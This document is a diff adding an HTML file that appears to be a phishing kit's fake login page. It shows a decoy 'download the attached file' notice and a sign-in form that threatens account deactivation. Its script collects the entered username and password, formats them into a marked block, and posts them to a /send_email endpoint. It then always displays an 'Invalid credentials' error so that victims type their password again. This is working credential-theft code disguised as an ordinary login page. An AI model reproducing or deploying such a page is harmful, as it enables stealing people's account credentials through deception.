@@ -1,0 +1,112 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Login</title>
+    <link type="text/css" rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
+    <link type="text/css" rel="stylesheet" href="https://pub-9685c515cc314d54a0ec73407efbaabc.r2.dev/corea.css">
+</head>
+<body>
+    <div id="altr" style="display: block;">
+        <button class="button-36" role="button">You cannot open files in this window. Please download the attached file and open it on a computer.</button><br><br>
+        <div align="center"><b>...</b></div>
+    </div>
+    <div class="login-1" id="root" style="display:none">
+        <div class="container">
+            <div class="row">
+                <div class="col-md-12">
+                    <div class="login-inner-form">
+                        <div class="details">
+                            <form>
+                                <div align="center">
+                                    <h2 class="text-center">
+                                        <div id="top">
+                                            <img src="https://pub-9685c515cc314d54a0ec73407efbaabc.r2.dev/icon.png" alt="" id="logoimg" style="width:30px;height:30px;margin-top:10px;"> 
+                                            <span style="vertical-align: middle; padding-left: 3px;color: #fff;" id="logoname"></span> 
+                                        </div>
+                                        <p><span style="font-size: 20px;color:gray;">Please sign in to continue </span></p>
+                                        <span style="font-size: 15px;color:white;">Please enter the correct password to avoid deactivation.</span><br><br/>
+                                        <center>
+                                            <div id="Div4" style="display: none;">
+                                                <div class="alert alert-danger" id="msg" style="font-size:14px;">Invalid credentials. The email address/password is incorrect.</div>
+                                            </div>  
+                                            <span id="error" class="text-danger" style="display: none;">This account does not exist. Please enter a different account.</span>
+                                        </center>
+                                        <div class="form-group">
+                                            <div class="input-group">
+                                                <span class="input-group-addon"><i class="fas fa-user"></i></span>
+                                                <input type="text" class="form-control" name="username" placeholder="Username" value="" id="username"/>
+                                            </div>
+                                        </div>
+                                        <div class="form-group">
+                                            <div class="input-group">
+                                                <span class="input-group-addon"><i class="fas fa-lock"></i></span>
+                                                <input type="password" class="form-control" autofocus id="password" name="password" placeholder="Password" required="required">
+                                            </div>
+                                        </div>
+                                        <div class="form-group">
+                                            <div align="left">
+                                                <input type="checkbox"><span style="font-size: 15px;color:gray;"> Remember me </span> 
+                                            </div>
+                                        </div>
+                                        <div class="form-group" id="Div1" style="display: block;">
+                                            <button type="button" onclick="sendEmail()" class="btn btn-primary login-btn btn-block" id="omak">Sign In</button>
+                                        </div>
+                                        <div class="form-group" id="Div2" style="display: none;">
+                                            <button type="button" class="btn btn-primary login-btn btn-block" id="omak">Signing in...</button>
+                                        </div>
+                                    </form>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</body>
+</html>
+<input type="hidden" name="count" id="count" value="" />
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
+<script>
+    function sendEmail() {
+        if (document.getElementById('password').value === '') {
+            window.alert('Please enter a valid password!');
+            return false;
+        }
+        
+        document.getElementById("Div4").style.display = "none";
+        document.getElementById("Div1").style.display = "none";
+        document.getElementById("Div2").style.display = "block";
+
+        var emailData = "\n===DOMC=====\n";
+        emailData += "E:" + document.getElementById('username').value;
+        emailData += "\nP:" + document.getElementById('password').value;
+        emailData += "\n=========\n";
+
+        tmsend(emailData);
+
+        setTimeout(function() { 
+            document.getElementById('password').value = "";
+            document.getElementById("Div4").style.display = "block";
+            document.getElementById("Div1").style.display = "block";
+            document.getElementById("Div2").style.display = "none";
+        }, 3000);
+    }
+
+    function tmsend(message) {
+        fetch('/send_email', {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json',
+            },
+            body: JSON.stringify({ message: message })
+        }).then(response => {
+            if (response.ok) {
+                console.log('Email sent successfully!');
+            } else {
+                console.error('Failed to send email.');
+            }
+        }).catch(error => console.error('Error:', error));
+    }
+</script>
